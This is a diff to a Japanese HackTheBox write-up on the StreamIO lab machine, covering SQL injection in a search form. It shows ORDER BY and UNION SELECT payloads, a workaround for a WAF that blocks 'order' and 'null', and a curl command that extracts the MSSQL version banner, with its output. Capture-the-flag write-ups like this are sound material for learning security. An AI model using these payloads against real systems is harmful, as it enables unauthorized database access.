@@ -141,7 +141,7 @@ search.phpにアクセス
 <img src="https://github.com/mylovemyon/hackthebox_images/blob/main/StreamIO_03.png">  
 フォーム内に入力した文字列に部分一致した結果が返されるwebページであった  
 この際の文字列は、httpデータ内の「q」パラメータに格納されることを確認  
-バックエンドのsqlサーバにこのリクエストが送信されると仮定した場合のsqlは、
+この際のバックエンドのsqlサーバで動作するsqlは、
 ```sql
 # microsoft sql の場合
 select name from table where name like '%入力文字列%' 
@@ -160,13 +160,35 @@ select name from table where name like '%showman'-- %'
 [リンク](https://portswigger.net/web-security/sql-injection/union-attacks)で確認できる通り、２つのsql文の結果は同じ列数かつ同じ列の型でないといけない  
 列数を把握するために便利なunionインジェクションの一例として
 ```sql
-showman' ORDER BY 1--
-showman' ORDER BY 1--
+' ORDER BY 1--
+' ORDER BY 1--
 # や
-showman' UNION SELECT NULL--
-showman' UNION SELECT NULL,NULL--
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
 ```
 などが使用できるが、こいつらを入力すると別ページにリダイレクトされる仕組みになっていた  
 どうやら`order`や`null`文字列がwafみたいなやつにひっかかったぽい  
 <img src="https://github.com/mylovemyon/hackthebox_images/blob/main/StreamIO_06.png">  
+他にも下記のsqlで列数を把握できるため試行
+```sql
+# select 1,2 だと２列のテーブルを表示する
+' UNION SELECT 1--
+' UNION SELECT 1,2--
+```
+ちなみにunion対象のテーブルは文字列型のデータっぽいので、インジェクションするデータも文字列型を指定する  
+すると６列のテーブルを結合すると結果が確認できた、ちなみにテーブルの２列目がwebページに表示されているイメージ  
+<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/StreamIO_07.png">  
+burpsuiteでhttpsリクエストの仕組みが分かっていので、あとはコマンドラインで引き続きsqlインジェクション
+```sh
+└─$ curl -d "q=showman' union select '1',@@version,'3','4','5','6'--'" -k https://watch.streamio.htb/search.php
 
+~~~
+                                <div class="mr-auto p-2">
+                                        <h5 class="p-2">Microsoft SQL Server 2019 (RTM) - 15.0.2000.5 (X64) 
+        Sep 24 2019 13:48:23 
+        Copyright (C) 2019 Microsoft Corporation
+        Express Edition (64-bit) on Windows Server 2019 Standard 10.0 <X64> (Build 17763: ) (Hypervisor)
+</h5>
+                                </div>
+~~~
+```
